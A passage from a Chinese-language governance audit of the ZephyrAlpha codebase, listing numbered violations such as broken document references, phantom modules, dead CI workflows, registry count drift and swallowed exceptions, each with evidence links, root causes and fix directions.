#### 5.4.10 governance_watchdog.py时间触发（MEDIUM）

**违反**：trae_060 §3 时间触发
**证据**：[governance_watchdog.py:141](file:///D:/ZephyrAlpha/src/zephyr/governance/governance_watchdog.py#L141) 时间触发
**病根**：根因1+根因4
**修复方向**：改事件驱动（commit事件触发）

#### 5.4.11 vms_cron_monitor.py时间触发（MEDIUM）

**违反**：trae_060 §3 时间触发
**证据**：[vms_cron_monitor.py:108](file:///D:/ZephyrAlpha/src/zephyr/trading/vms_cron_monitor.py#L108) 时间触发
**病根**：根因1
**修复方向**：改事件驱动或CI兜底

#### 5.4.12 auto_fix_cron.py时间触发（MEDIUM）

**违反**：trae_060 §3 时间触发
**证据**：[auto_fix_cron.py:108](file:///D:/ZephyrAlpha/scripts/governance/auto_fix_cron.py#L108) 时间触发
**病根**：根因1
**修复方向**：改事件驱动或CI兜底

#### 5.4.13 3个stability词表硬编码点（MEDIUM × 3）

**违反**：trae_060 §2 硬编码词表
**证据**：
1. [prompt_registry.py:86](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/prompt_registry.py#L86) `_STABILITY_VALUES = frozenset({"experimental","beta","stable","frozen"})`
2. [skill_registry.py:50](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_registry.py#L50) 同上
3. [support/prompt_registry.py:85](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/support/prompt_registry.py#L85) 同上
- 硬编码值`{experimental,beta,stable,frozen}` 与词表真源`{frozen,stable,evolving,volatile}` **不匹配**（最高漂移源）
**病根**：根因2（GATE-VOCAB未检出——变量名_STABILITY_VALUES不匹配检测模式）
**修复方向**：3处统一改从`stability_vocabulary.yaml`动态加载

#### 5.4.14 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 1（5.4.1） |
| MEDIUM | 16（5.4.2~5.4.13） |
| LOW | 0 |
| **合计** | **17** |

---

### 5.5 文档引用断裂违规（26个，第5轮新增）

> **维度新增理由**：初轮未系统检查文档间引用是否指向真实存在的文件。第5轮Grep扫描发现136处引用断裂+338处连字符路径违规，远超5.3.6原报告的11文件57行。

#### 5.5.1 code-construction-standards.md大规模断链（HIGH，1聚合 = 57文件136处）

**违反**：trae_060 §2 唯一真源（文档引用断裂=SSoT分裂）
**证据**：
- [code-construction-standards.md](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/code-construction-standards.md) 引用57个文件路径，136处断裂
- 引用的文件已被移动到`_archive/`或重命名，但文档未同步更新
**病根**：根因1（静态快照——文档移动未触发引用同步）
**修复方向**：建立文档引用reconciler（post-commit触发，扫描.md引用的文件是否存在）

#### 5.5.2 连字符路径大规模违规（HIGH，1聚合 = 57文件338处）

**违反**：trae_060 §2 + project_memory文件名snake_case铁律
**证据**：
- 57个文件使用连字符路径（如`docs/02_enterprise_architecture/00-overview-entry/`应为`00_overview_entry/`）
- 338处违规，是5.3.6原报告（11文件57行）的9倍
- 100个`.py`文件`[BLUEPRINT]`头使用连字符路径
**病根**：根因1（静态快照——5.3.6已列但规模被严重低估）
**修复方向**：批量重命名+门禁阻断新违规

#### 5.5.3 AGENTS.md引用不存在的onboarding_detail.md（HIGH）

**违反**：trae_060 §1 唯一真源 + 新AI可发现性
**证据**：
- [AGENTS.md:4](file:///D:/ZephyrAlpha/AGENTS.md#L4) 引用`.trae/rules/onboarding_detail.md`
- 实际文件不存在——新AI冷启动入口断裂
- 该文件被AGENTS.md §7、§8等多处引用
**病根**：根因1（文档移动未同步引用）
**修复方向**：恢复onboarding_detail.md或更新AGENTS.md引用指向真实文件

#### 5.5.4 债务登记册自指断链（MEDIUM × 4）

**违反**：trae_060 §2 唯一真源（债务登记册自身引用断裂=元漂移）
**证据**：本债务登记册引用`core_function_dependency_design.md`（4处），但该文件已移到`_archive/`目录
**病根**：根因1（文件移动未触发引用同步）
**修复方向**：更新本登记册引用路径

#### 5.5.5 AGENTS.md §6 vs §11 depgraph存储描述矛盾（HIGH）

**违反**：trae_060 §1 唯一真源
**证据**：
- [AGENTS.md:145](file:///D:/ZephyrAlpha/AGENTS.md#L145) §6 描述depgraph为SQLite
- AGENTS.md §11 描述depgraph为PostgreSQL
- 实际为PostgreSQL 16
**病根**：根因1（文档版本未同步）
**修复方向**：统一为PostgreSQL

#### 5.5.6 AGENTS.md声明make_ttl_reconciler"已删"但代码存在（HIGH）

**违反**：trae_060 §1 唯一真源（宪法级声明与代码不符）
**证据**：
- [AGENTS.md:187](file:///D:/ZephyrAlpha/AGENTS.md#L187) §11 声明`make_ttl_reconciler`已删除
- [reconciliation_registry.py:418](file:///D:/ZephyrAlpha/src/zephyr/governance/reconciliation_registry.py#L418) 函数仍完整存在
**病根**：根因1（文档与代码脱节）
**修复方向**：删除函数或更新AGENTS.md声明

#### 5.5.7 check_blueprint_code_alignment.py三方矛盾（HIGH）

**违反**：trae_060 §1 唯一真源（对齐检查器自身不对齐）
**证据**：
- [check_blueprint_code_alignment.py:1](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/check_blueprint_code_alignment.py#L1) 声明`MOD-INF-005`
- [check_blueprint_code_alignment.py:17](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/check_blueprint_code_alignment.py#L17) 声明`MOD-INF-024`
- [check_blueprint_code_alignment.py:38-40](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/check_blueprint_code_alignment.py#L38-L40) `BLUEPRINT_PATH` 指向不存在的连字符路径
- 三方声明互相矛盾
**病根**：根因1（脚本头声明未随重命名同步）
**修复方向**：统一为单一module_id + 修正路径

#### 5.5.8 3个无效module_id不在blueprint_registry（HIGH × 3）

**违反**：trae_060 §1 唯一真源
**证据**：
- `MOD-EX_CORE`、`MOD-SIMULATION`、`MOD-INFRA_RUNTIME` 在代码中被引用
- 但不在`blueprint_registry.yaml`中
**病根**：根因1（注册表与代码脱节）
**修复方向**：补注册或修正代码引用

#### 5.5.9 rule_catalog_registry 20条stability字段空值（MEDIUM，1聚合 = 20条）

**违反**：trae_060 §2 唯一真源（stability是词表值，空值=未声明）
**证据**：
- [rule_catalog_registry.yaml](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/rule_catalog_registry.yaml) 20条规则`stability: ''`
- stability合法值见`stability_vocabulary.yaml`（frozen/stable/evolving/volatile）
**病根**：根因1（注册表未强制填值）
**修复方向**：补填stability值 + 门禁阻断空值

#### 5.5.10 blueprint_registry.yaml module_id重复（MEDIUM × 2）

**违反**：trae_060 §1 唯一真源
**证据**：
- `MOD-GOVERNANCE` 在blueprint_registry.yaml出现2次
- `MOD-FEEDBACK_LOOP` 在blueprint_registry.yaml出现2次
**病根**：根因1（注册表无唯一性门禁）
**修复方向**：加UNIQUE约束 + 清理重复

#### 5.5.11 17处其他文档断链（6 HIGH + 1 MEDIUM + 10 LOW）

**违反**：trae_060 §2 唯一真源
**证据**：第5轮Grep扫描发现17处其他文档引用断裂，包括：
- 6处HIGH：核心架构文档引用断裂
- 1处MEDIUM：辅助文档引用断裂
- 10处LOW：边缘文档引用断裂
- 具体清单见第5轮审计原始输出
**病根**：根因1（文档移动未触发引用同步）
**修复方向**：文档引用reconciler批量修复

#### 5.5.12 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 9（5.5.1/5.5.2/5.5.3/5.5.5/5.5.6/5.5.7/5.5.8×3） |
| MEDIUM | 3（5.5.4/5.5.9/5.5.10） |
| LOW | 14（5.5.11中的10低+其他） |
| **合计** | **26** |

---

### 5.6 三方对齐与规则一致性违规（9个，第5轮新增）

> **维度新增理由**：初轮未检查"规则文档声明 vs 代码实现 vs 注册表登记"三方一致性。第5轮发现9个三方不符违规。

#### 5.6.1 check_blueprint_code_alignment.py三方矛盾（HIGH）

**说明**：与5.5.7同源，此处归入"三方对齐"维度（跨维度计数=同一问题在2个维度均计入）
**证据**：见5.5.7

#### 5.6.2 make_ttl_reconciler宪法级不符（HIGH）

**说明**：与5.5.6同源，此处归入"三方对齐"维度
**证据**：见5.5.6

#### 5.6.3 3个无效module_id不在blueprint_registry（HIGH × 3）

**说明**：与5.5.8同源，此处归入"三方对齐"维度
**证据**：见5.5.8

#### 5.6.4 navigation_index.md缺失frontmatter（MEDIUM）

**违反**：trae_047 工程文件头（A_md frontmatter）
**证据**：
- [navigation_index.md](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/00_overview_entry/navigation_index.md) 缺失frontmatter
- 该文件在永久区路径，应含`ttl: permanent`等字段
**病根**：根因1（生成器未强制frontmatter）
**修复方向**：生成器补frontmatter

#### 5.6.5 trae_060 §5静态违规清单漂移3.8倍（HIGH）

**违反**：trae_060 §4 第一性原理治本（规则文档自身漂移）
**证据**：
- [trae_060_inward_consolidation.yaml:209](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L209) §5 声明"手工触发~25处"
- 实际`[STARTUP] manual`标记=96处
- 声明值与实测值漂移3.8倍（25 vs 96）
- 但`stability: frozen` + `modification_permission: immutable_core`阻止更新
**病根**：根因1（静态快照机制本身的设计缺陷）
**修复方向**：把§5静态清单替换为动态仪表盘（第0期施工）

#### 5.6.6 RULE-ZERO/RULE-FOUR未注册capability反查（HIGH）

**违反**：trae_060 §1 唯一真源 + 新AI可发现性
**证据**：
- [.trae/rules/project_rules.md](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md) RULE-ZERO（lock_files.py）和RULE-FOUR（scaffold.py）是关键铁律
- 但未在`capability_canonical_file_registry.yaml`注册反查
**病根**：根因3（CapabilityLookup建议性反查）
**修复方向**：补注册capability反查

#### 5.6.7 rule_catalog_registry 20条空stability（MEDIUM）

**说明**：与5.5.9同源，此处归入"三方对齐"维度
**证据**：见5.5.9

#### 5.6.8 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 6（5.6.1/5.6.2/5.6.3×3/5.6.5/5.6.6） |
| MEDIUM | 3（5.6.4/5.6.7 + 跨维度计数调整） |
| LOW | 0 |
| **合计** | **9** |

> **跨维度计数说明**：5.6.1/5.6.2/5.6.3/5.6.7与5.5.x同源，在2个维度均计入。这是有意为之——同一问题从不同视角审视会有不同治理路径（5.5视角=文档引用修复，5.6视角=三方对齐门禁）。

---

### 5.7 CI死工作流与幻影模块（4个，第6轮新增）

> **维度新增理由**：初轮未检查CI工作流是否真实可触发、是否引用不存在模块。第6轮发现2个死CI工作流+1个幻影生成器+1个幻影模块。

#### 5.7.1 red-blue-validator.yml完全死亡（HIGH）

**违反**：trae_060 §3 事件驱动（CI是事件触发的一种，死工作流=事件链断裂）
**证据**：
- [.github/workflows/red-blue-validator.yml:8-16](file:///D:/ZephyrAlpha/.github/workflows/red-blue-validator.yml#L8-L16) paths-filter引用8个不存在路径
- [.github/workflows/red-blue-validator.yml:46,51,56,60,94](file:///D:/ZephyrAlpha/.github/workflows/red-blue-validator.yml#L46) 5处调用`python -m zephyr.red_blue_validator`（模块不存在）
- 4个步骤`continue-on-error: true`掩盖失败
**病根**：根因3（可发现性断裂在CI层的变体）
**修复方向**：删除死工作流或恢复模块

#### 5.7.2 dedup-test.yml引用连字符路径永不触发（HIGH）

**违反**：trae_060 §3 + Python模块命名规范
**证据**：
- [.github/workflows/dedup-test.yml:6,10](file:///D:/ZephyrAlpha/.github/workflows/dedup-test.yml#L6) 引用`src/zephyr/l01-infrastructure/code_dedup_engine/**`（连字符+不存在）
**病根**：根因1（静态快照——重命名后未同步CI配置）
**修复方向**：删除或修正路径

#### 5.7.3 code_dedup_engine幻影模块（HIGH）

**违反**：trae_060 §1 唯一真源（20个文件引用但实现不存在）
**证据**：
- 20个.py文件引用code_dedup_engine（src/zephyr/governance/下7个 + tests/下5个 + scripts/下5个）
- `Glob src/zephyr/**/code_dedup_engine/**/*.py` → No file found
- 蓝图存在：[docs/03_modules/_domain_governance/code_dedup_engine/blueprint.md](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/code_dedup_engine/blueprint.md)
**病根**：根因3（最严重变体——真源从未创建但被假装存在）
**修复方向**：删除所有引用或创建实现

#### 5.7.4 capability_canonical_file_registry引用幻影生成器（HIGH）

**违反**：trae_060 §2 唯一真源（注册表引用不存在文件）
**证据**：
- [capability_canonical_file_registry.yaml:551](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/capability_canonical_file_registry.yaml#L551) 声明`generate_runtime_plane_mapping.py`
- Glob全仓库扫描→No file found
**病根**：根因1（重命名后注册表未同步）
**修复方向**：修正注册表引用

#### 5.7.5 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 4 |
| MEDIUM | 0 |
| **合计** | **4** |

---

### 5.8 测试与静态分析免疫系统（3个，第6轮新增）

> **维度新增理由**：第6轮发现测试层113处try/except import-skip + linter层F821全局忽略，形成"断链不可见"的系统性盲区——不是个别断链，而是整个测试/linter体系对断链"免疫"。

#### 5.8.1 113处try/except import-skip使GATE-18失效（HIGH，1聚合 = 113处/100文件）

**违反**：trae_060 §4 第一性原理治本（测试免疫系统=治标不治本）
**证据**：
- `try:\n    from zephyr` 模式：113处/100文件
- `pytest.mark.skipif(not _IMPORT_OK` 标记：116处/56文件
- 代表：[tests/test_protection_index.py:15](file:///D:/ZephyrAlpha/tests/test_protection_index.py#L15)（单文件15处最密集）
**病根**：新增病根维度——测试免疫系统（被检测对象主动吞掉异常）
**修复方向**：删除try/except import-skip，改为硬import（模块不存在则测试失败）

#### 5.8.2 pyproject.toml全局忽略F821（MEDIUM）

**违反**：trae_060 §4 第一性原理治本（linter免疫=治标不治本）
**证据**：
- [pyproject.toml:138](file:///D:/ZephyrAlpha/pyproject.toml#L138) `"F821", # undefined name (TraceContext等系统性问题，需批量修复，后续建卡处理)`
- 注释自承"系统性问题"但未建卡
**病根**：与5.8.1同源（linter层免疫）
**修复方向**：修复TraceContext后移除F821全局忽略

#### 5.8.3 tests/governance/conftest.py引用连字符manifest（HIGH）

**违反**：trae_060 §2 唯一真源（测试夹具引用断裂）
**证据**：
- [tests/governance/conftest.py:37](file:///D:/ZephyrAlpha/tests/governance/conftest.py#L37) `manifest_path = repo_root / "scripts" / "script-manifest.yaml"`（连字符）
- 实际文件是`scripts/script_manifest.yaml`（下划线）
- `manifest`和`script_entries`两个fixture调用时FileNotFoundError
**病根**：根因1（重命名后未同步）
**修复方向**：修正为下划线

#### 5.8.4 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 2（5.8.1聚合+5.8.3） |
| MEDIUM | 1（5.8.2） |
| **合计** | **3** |

---

### 5.9 元数据数字漂移与计数不一致（7个，第6轮新增）

> **维度新增理由**：第6轮发现治理体系自身计数的SSoT分裂——gate数、词表数、MCP数、模块数等在AGENTS.md/project_memory/实际文件三方不一致。

#### 5.9.1 gate数量三方不一致52/49/51（HIGH）

**证据**：
- [AGENTS.md:33](file:///D:/ZephyrAlpha/AGENTS.md#L33) 声明52个gate
- project_memory.md声明49门禁
- .pre-commit-config.yaml实际51个gate-* id
**病根**：根因1（静态快照——计数SSoT分裂）
**修复方向**：建立计数reconciler自动同步

#### 5.9.2 MCP数量矛盾10/11（MEDIUM）

**证据**：
- [AGENTS.md:40](file:///D:/ZephyrAlpha/AGENTS.md#L40) 声明10个MCP Server
- [blueprint_registry.yaml:340](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L340) MOD-INF-013 summary写"11个"
- config/mcp.json实际10个
**病根**：根因1（blueprint summary stale）
**修复方向**：修正blueprint summary

#### 5.9.3 rules/index.md缺失trae_059/060（HIGH）

**证据**：
- [rules/index.md:80](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/index.md#L80) 仅列到trae_058
- trae_059/060文件存在但索引未登记
- frontmatter `updated: 2026-06-22` 未同步
**病根**：根因1（自动索引生成器未触发，违反trae_060 §3事件驱动）
**修复方向**：重生索引 + 建立规则文件变更触发索引重生的事件钩子

#### 5.9.4 词表数量34 vs 35（LOW）

**证据**：
- [AGENTS.md:33](file:///D:/ZephyrAlpha/AGENTS.md#L33) 声明34个词表
- project_memory.md声明35词表
- Glob实际35个.yaml文件
**病根**：根因1（计数SSoT分裂）
**修复方向**：统一为35

#### 5.9.5 frontmatter_field_registry计数53 vs 54（LOW）

**证据**：
- [frontmatter_field_registry.yaml:12](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/frontmatter_field_registry.yaml#L12) `total_registered: 53`
- `summary.total_fields: 54`（行635）
**病根**：根因1（注册表内部计数不一致）
**修复方向**：对齐计数

#### 5.9.6 script_manifest双源569 vs 379（MEDIUM）

**证据**：
- [scripts/script_manifest.yaml](file:///D:/ZephyrAlpha/scripts/script_manifest.yaml) `total_scripts: 569`（auto-scan）
- [scripts/governance/script_manifest.yaml](file:///D:/ZephyrAlpha/scripts/governance/script_manifest.yaml) `total_scripts: 379`（__manifest__块扫描）
- 两个manifest不同schema不同生成器
**病根**：根因1（双真源冲突）
**修复方向**：裁定保留单一manifest体系

#### 5.9.7 blueprint_registry 5天未刷新（MEDIUM）

**证据**：
- [blueprint_registry.yaml:4-9](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L4) `last_updated: '2026-06-25'`
- 今天2026-06-30，5天未刷新
**病根**：根因1（派生注册表stale）
**修复方向**：建立蓝图变更触发registry重生的事件钩子

#### 5.9.8 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 2（5.9.1/5.9.3） |
| MEDIUM | 3（5.9.2/5.9.6/5.9.7） |
| LOW | 2（5.9.4/5.9.5） |
| **合计** | **7** |

---

### 5.10 注册表消费链与引用断裂（22个，第6轮新增）

> **维度新增理由**：第6轮发现注册表→消费方、__init__→子包、生成器→输出、架构模型→文件等多层消费链断裂。

#### 5.10.1 34词表全部无consumers字段（MEDIUM，1聚合 = 34词表）

**证据**：
- `docs/01_policies_and_standards/_registry/vocabularies/`全目录grep `^consumers:` → No matches found
- 词表不知道谁在消费自己（与5.1词表硬编码互补）
**病根**：根因3（词表→代码方向断裂）
**修复方向**：词表补consumers字段 + reconciler自动维护

#### 5.10.2 work_dags引用17个capability_id三方断裂（HIGH，1聚合 = 15个无card + 17个不在registry）

**证据**：
- data/work_dags/*.yaml引用17个kebab-case capability_id
- 仅2个有capability_card，15个无card
- 17个全部不在capability_canonical_file_registry（snake_case）
**病根**：根因6（work_dags↔cards↔registry三方断裂 + kebab/snake命名不一致）
**修复方向**：统一命名风格 + 补card/注册

#### 5.10.3 30个capability_cards全错配MOD-INF-035（HIGH，1聚合 = 30卡片）

**证据**：
- data/capability_cards/下30个yaml的module_id全部错误声明为MOD-INF-035
- 实际能力对应完全不同模块（如skill_dom_a2a_001应属MOD-INF-025）
- skill_dom_a2a_001.yaml:11 description内已写明正确ID但module_id字段仍错
**病根**：根因1（批量模板复制后忘记修改——违反trae_060 §2禁止同步复制）
**修复方向**：逐个修正module_id

#### 5.10.4 project_memory depgraph术语stale（MEDIUM）

**证据**：
- project_memory.md:8仍引用"depgraph"文件路径
- 实际已迁移至PostgreSQL 16（localhost:5432）
**病根**：根因1（术语stale）
**修复方向**：更新project_memory术语

#### 5.10.5 rules/index.md引用已删_index.yaml（MEDIUM）

**证据**：
- [rules/index.md:22](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/index.md#L22) 引用`_index.yaml`
- AGENTS.md:374声明"原rules/_index.yaml手工索引已删除"
**病根**：根因1（删除文件未清理引用）
**修复方向**：清理引用

#### 5.10.6 src/zephyr/__init__.py __all__声明9个幻影子包（HIGH，1聚合 = 9个）

**证据**：
- [src/zephyr/__init__.py:163-194](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L163) __all__列出30个子包名
- 9个无对应目录：execution/observability/orchestration/portfolio/research/resilience/semantic_auditor/signal/testing
**病根**：根因1（包注册表漂移）
**修复方向**：清理__all__

#### 5.10.7 register_lazy("signal")指向不存在包（HIGH）

**证据**：
- [src/zephyr/__init__.py:161](file:///D:/ZephyrAlpha/src/zephyr/__init__.py#L161) `register_lazy("signal", "zephyr.signal")`
- src/zephyr/signal/目录不存在
**病根**：根因1（懒加载注册断裂）
**修复方向**：删除或修正指向

#### 5.10.8 generate_domain_dependency_diagram.py输出未注册（HIGH）

**证据**：
- [generate_domain_dependency_diagram.py:49](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/generators/generate_domain_dependency_diagram.py#L49) 输出到`generated/domains/`
- capability_canonical_file_registry.yaml未登记此生成器和输出目录
**病根**：根因1（生成器注册不全）
**修复方向**：补注册

#### 5.10.9 generate_contracts.py和domain_name_mapping.py未注册（MEDIUM × 2）

**证据**：两个文件存在但未在outputs映射中登记
**病根**：根因1
**修复方向**：补注册

#### 5.10.10 generators/__init__.py __all__声明幻影导出（MEDIUM）

**证据**：
- [generators/__init__.py:4](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/generators/__init__.py#L4) `__all__ = ["auto_generate_index", "generate_contracts"]`
- auto_generate_index.py不存在（实际是generate_navigation_index.py）
**病根**：根因1（重命名后未同步）
**修复方向**：修正__all__

#### 5.10.11 _common.py [CONSUMERS]头部引用不存在文件（MEDIUM）

**证据**：
- [_common.py:5](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/generators/_common.py#L5) `# [CONSUMERS] generate_domain_doc.py; generate_domain_architecture_diagram.py`
- 实际文件名是generate_domain_dependency_diagram.py
**病根**：根因1（命名漂移）
**修复方向**：修正头部

#### 5.10.12 capability_canonical_file_registry头部module_id stale（MEDIUM）

**证据**：
- [capability_canonical_file_registry.yaml:5](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/capability_canonical_file_registry.yaml#L5) 头部注释`# module_id: PS-REG-019`
- 正文行69 `module_id: PS-REG-021`
**病根**：根因1（头部注释stale）
**修复方向**：修正头部

#### 5.10.13 ai_autonomy_authority_registry depends_on含TODO占位符（MEDIUM）

**证据**：
- [ai_autonomy_authority_registry.yaml:23-24](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/ai_autonomy_authority_registry.yaml#L23) `at: "$TODO", why: "TODO -- auto-converted"`
**病根**：根因1（未完成转换）
**修复方向**：补完转换

#### 5.10.14 3个catalog漏登记到registry_master_index（HIGH，1聚合 = 3个）

**证据**：
- registry_master_index.yaml声明total_registries: 19
- 实际catalogs/目录有22个YAML，3个未登记：ai_autonomy_authority_registry/depgraph_scan_exclusions/frontmatter_field_registry
**病根**：根因1（索引漏登记）
**修复方向**：补登记

#### 5.10.15 registry_master_index entry_count为0但实际约30（MEDIUM）

**证据**：
- [registry_master_index.yaml:48](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/registry_master_index.yaml#L48) capability_canonical_file_registry `entry_count: 0`
- 实际约30条能力
**病根**：根因1（索引数据stale）
**修复方向**：修正entry_count

#### 5.10.16 registry_consistency_contract REG-001引用不存在文件（HIGH）

**证据**：
- [registry_consistency_contract.yaml:88-90](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/contracts/registry_consistency_contract.yaml#L88) REG-001 `path: "docs/03_modules/module-registry.yaml"`
- 实际是blueprint_registry.yaml
**病根**：根因1（重命名后未同步契约）
**修复方向**：修正path

#### 5.10.17 catalogs/_index.yaml语义错配（MEDIUM）

**证据**：
- [_registry/catalogs/_index.yaml](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/_index.yaml) 文件名暗示是catalog索引
- 实际内容是TRAE规则描述表
**病根**：根因1（命名/语义错配）
**修复方向**：重命名或迁移内容

#### 5.10.18 architecture_issue_registry status非法值unknown（LOW）

**证据**：
- [registry_master_index.yaml:33](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/catalogs/registry_master_index.yaml#L33) `status: unknown`
- unknown不在status_vocabulary合法枚举内
**病根**：根因2（词表值未强制校验）
**修复方向**：改为合法值

#### 5.10.19 D_GOV_REPAIR layer_id为空（MEDIUM）

**证据**：
- [architecture_model/index.yaml:209-211](file:///D:/ZephyrAlpha/architecture_model/index.yaml#L209) D_GOV_REPAIR `layer_id:`后无值
- 53域中唯一无layer_id的域
**病根**：根因1（架构模型数据缺失）
**修复方向**：补填layer_id

#### 5.10.20 index.yaml引用4个不存在YAML（LOW，1聚合 = 4个）

**证据**：
- [architecture_model/index.yaml:39,43,62,66](file:///D:/ZephyrAlpha/architecture_model/index.yaml#L39) 引用frontend/frontend_model.yaml等4个文件
- 4个文件均不存在（标status: planned但未声明暂缓）
**病根**：根因1（引用断裂）
**修复方向**：声明暂缓或删除引用

#### 5.10.21 layers下2个文件未被index引用（LOW，1聚合 = 2个）

**证据**：
- b_execution_model.yaml和system_telemetry.yaml存在
- index.yaml b_track未引用
- global_stats声明b_track_modules: 12，实际14
**病根**：根因1（登记不全）
**修复方向**：补登记或对齐计数

#### 5.10.22 blueprint MOD-GOVERNANCE重复使用（HIGH）

**证据**：
- [docs/03_modules/_domain_governance/blueprint.md:2](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/blueprint.md#L2) `module_id: MOD-GOVERNANCE`
- [docs/03_modules/_domain_governance/capacity_upgrade/blueprint.md:2](file:///D:/ZephyrAlpha/docs/03_modules/_domain_governance/capacity_upgrade/blueprint.md#L2) 同样`module_id: MOD-GOVERNANCE`
- capacity_upgrade应迁为DOM-GOV-CAP-001但未迁移
**病根**：根因1（迁移不完整）
**修复方向**：迁移module_id

#### 5.10.23 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 9（5.10.2/5.10.3/5.10.6/5.10.7/5.10.8/5.10.14/5.10.16/5.10.22 + 聚合） |
| MEDIUM | 9（5.10.1/5.10.4/5.10.5/5.10.9×2/5.10.10/5.10.11/5.10.12/5.10.13/5.10.15/5.10.17/5.10.19） |
| LOW | 4（5.10.18/5.10.20/5.10.21 + 计数调整） |
| **合计** | **22** |

---

### 5.11 门禁与规则格式漂移（6个，第6轮新增）

> **维度新增理由**：第6轮发现CommitGateRegistry迁移严重不完整、GATE入口模块名拼写错误、trae规则depends_on格式6种混用等门禁层与规则层格式漂移。

#### 5.11.1 CommitGateRegistry迁移严重不完整4/12/51（HIGH）

**违反**：AGENTS.md §8"禁止在commit()方法体硬编码_check_*调用"
**证据**：
- [commit_gate_registry.py](file:///D:/ZephyrAlpha/src/zephyr/governance/commit_gate_registry.py) 仅注册4个gate
- [git_commit_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/governance/git_commit_gateway.py) 仍有12个硬编码`_check_*`方法
- .pre-commit-config.yaml含51个gate-* id
- 三层门禁数字严重不一致：registry 4 vs gateway硬编码12 vs pre-commit 51
**病根**：根因3（架构债务#AD-001未完成迁移）
**修复方向**：完成12个硬编码gate迁移到registry

#### 5.11.2 GATE-DRIFT引用不存在的behavioral_auditor模块（MEDIUM）

**证据**：
- [.pre-commit-config.yaml:941](file:///D:/ZephyrAlpha/.pre-commit-config.yaml#L941) `entry: python -m zephyr.behavioral_auditor scan --level LIGHT`
- 实际模块名是`zephyr.behavioral_audit`（auditor vs audit拼写混淆）
- stages:[manual]降低了日常影响
**病根**：根因3（门禁入口模块名漂移）
**修复方向**：修正为behavioral_audit

#### 5.11.3 MOD-INF-028 construction_progress非法值（HIGH）

**证据**：
- [blueprint_registry.yaml:583](file:///D:/ZephyrAlpha/docs/03_modules/blueprint_registry.yaml#L583) `construction_progress: mostly_implemented`
- schema仅允许5值：not_started/design_only/scaffold/partially_implemented/completed
- mostly_implemented不在合法枚举内
**病根**：根因2（schema约束违反）
**修复方向**：改为partially_implemented

#### 5.11.4 trae规则depends_on格式6种混用（MEDIUM，1聚合 = 多文件）

**证据**：
- trae_032/033/041等文件的depends_on[].target格式混用6种：TRAE-XXX / PS-STD-XXX §X.Y / GOV-MOD-XXX §X / 文件路径 / AGENTS.md §X.Y / MOD-XXX
- 违反trae_029 §gov_doc_009结构化map格式要求
- 对比trae_060格式规范（全为TRAE-XXX）
**病根**：根因1（格式约定违反/元规则不一致）
**修复方向**：统一为rule_id格式

#### 5.11.5 doc_type operational_rule指向真空目录（MEDIUM）

**证据**：
- [doc_type_vocabulary.yaml:65-74](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/_registry/vocabularies/doc_type_vocabulary.yaml#L65) operational_rule的allowed_directories声明`docs/01_policies_and_standards/operational/`
- 该目录不存在（LS验证）
**病根**：根因1（DCR-002校验基础错误）
**修复方向**：创建目录或修正allowed_directories

#### 5.11.6 script_manifest domain/description字段为垃圾值（LOW，1聚合 = 多条）

**证据**：
- [scripts/script_manifest.yaml](file:///D:/ZephyrAlpha/scripts/script_manifest.yaml) domain字段填文件名（如`domain: __init__.py`）
- description字段填代码首行（如`description: import sys`）
- auto-scan把首行代码当描述、把文件名当域
**病根**：根因1（manifest数据质量）
**修复方向**：修正生成器解析逻辑

#### 5.11.7 小计

| 严重度 | 数量 |
|---|:---:|
| HIGH | 2（5.11.1/5.11.3） |
| MEDIUM | 3（5.11.2/5.11.4/5.11.5） |
| LOW | 1（5.11.6） |
| **合计** | **6** |

---

### 5.12 代码语义与异常处理反模式（30个，第7轮新增）

> **维度新增理由**：前6轮聚焦"文件存在性/引用断裂/计数漂移"，第7轮深扫代码语义发现205处except:pass吞异常、函数签名漂移、并发泄漏等代码层面问题。

#### 5.12.1 except Exception: pass系统性吞异常（CRITICAL，1聚合 = 205处/100文件）

**违反**：trae_060 §4 第一性原理治本（静默吞失败=治标不治本）
**证据**：
- 205处`except Exception: pass`分布在100文件
- 最危险聚簇：
  - [integration/pipeline_orchestrator.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py) 12处（编排器故障不可见）
  - [infrastructure/rollback/rollback_executor.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rollback/rollback_executor.py) 12处（回滚失败不可见）
